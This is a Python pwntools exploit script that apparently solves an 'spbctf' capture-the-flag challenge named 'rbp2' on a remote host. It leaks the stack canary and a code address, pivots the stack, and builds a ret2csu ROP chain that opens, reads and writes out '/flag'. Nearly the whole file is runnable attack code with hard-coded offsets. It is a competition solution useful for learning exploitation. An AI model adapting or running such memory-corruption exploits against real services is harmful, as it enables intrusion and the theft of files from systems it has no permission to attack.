#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./rbp2')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or  11615)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments
io = start()

libc_csu_init_offset = 0x1330
gift_addr_offset = 0x129A
buf2_addr_offset = 0x40C0
libc = ELF("libc-2.27.so")

io.recvuntil("iar!\n")
io.send(cyclic(11))
leak = io.recvuntil("Are")[11:]
canary = u64(b"\x00"+ leak[:7])
libc_csu_init = u64(leak[7:-4].ljust(8, b"\x00"))
# log.info(len(str(libc_csu_init)))

log.info(f"Leaked canary: {hex(canary)}")
log.info(f"Leaked libc_csu_init: {hex(libc_csu_init)}")

start_addr = libc_csu_init - libc_csu_init_offset
gift_addr = start_addr + gift_addr_offset
write_got = start_addr + exe.got['write']
read_got = start_addr + exe.got['read']
open_got = start_addr + exe.got['open']
# puts_got = start_addr + exe.got['puts']
main_addr = start_addr + exe.symbols['main']
csu_end_addr = start_addr + 0x1382 # csu_end_offset
csu_start_addr_without_mov_edi = start_addr + 0x1371
csu_start_addr = start_addr + 0x1368 # csu_start_offset
buf2_addr = start_addr + buf2_addr_offset
save_addr = start_addr + 0x1385

leave_ret_addr = start_addr + 0x1298
pop_rdx = start_addr + 0x129a
pop_rdi = start_addr + 0x138b
mov_rdi_rax = start_addr + 0x131c
pop_rsi_r15 = start_addr + 0x1389

write_in_main = start_addr + 0x1211


log.info(f"Leaked buf2_addr: {hex(buf2_addr)}")

#buf side
pl = cyclic(10)
pl += p64(canary)
pl += p64(buf2_addr)
pl += p64(leave_ret_addr) # stack pivot
io.send(pl)


#buf2 side
def csu(rbx, rbp, r12, r13, r14, r15, additional=False):
    # r15 - func_addr_to_call
    # r14  -> rdx
    # r13  -> rsi
    # r12d -> edi
    # rbx = 0
    # rbp = 1
    payload = b""
    if additional:
        payload += p64(pop_rsi_r15)
        payload += p64(r13)
        payload += p64(r15)
        payload += p64(pop_rdx)
        payload += p64(r14)
        payload += p64(pop_rdi)
        payload += p64(r12)

        payload += p64(csu_start_addr_without_mov_edi)
    else:
        payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) # pop rbx, rbp, r12, r13, r14, r15
        payload += p64(csu_start_addr) # add rsp, 8 and pop rbx, rbp, r12, r13, r14, r15 (total 48)
    payload += b'\x00' * 0x38
    return payload

pl = b"/flag\x00\x00"
# how to leak libc:
#   pl += csu(0, 1, 1, write_got, 8, write_got)

# open: esi -> 0, rdi -> ptr to filename
pl += p64(csu_end_addr) + p64(0) + p64(1) + p64(0) + p64(0) + p64(0) + p64(open_got)
pl += p64(pop_rdi)
pl += p64(buf2_addr+1)
pl += p64(pop_rsi_r15) + p64(0) + p64(open_got)
pl += p64(csu_start_addr_without_mov_edi) + p64(0) + p64(0) + p64(1) + p64(5) + p64(buf2_addr+1) + p64(41) + p64(read_got) # fd = 5 - random, if local fd = 3
# read: rdx -> num of bytes, rsi -> ptr to buf, rdi -> fd
pl += p64(csu_start_addr) + p64(0) + p64(0) + p64(1) + p64(1) + p64(buf2_addr+1) + p64(41) + p64(write_got)
# write: rdx -> num of bytes, rsi -> ptr to buf, rdi -> fd
pl += p64(csu_start_addr)
io.sendline(pl)


io.recvuntil("spbctf")
flag = io.recv().decode()
log.success(f"Flag: spbctf{flag}")

io.close()


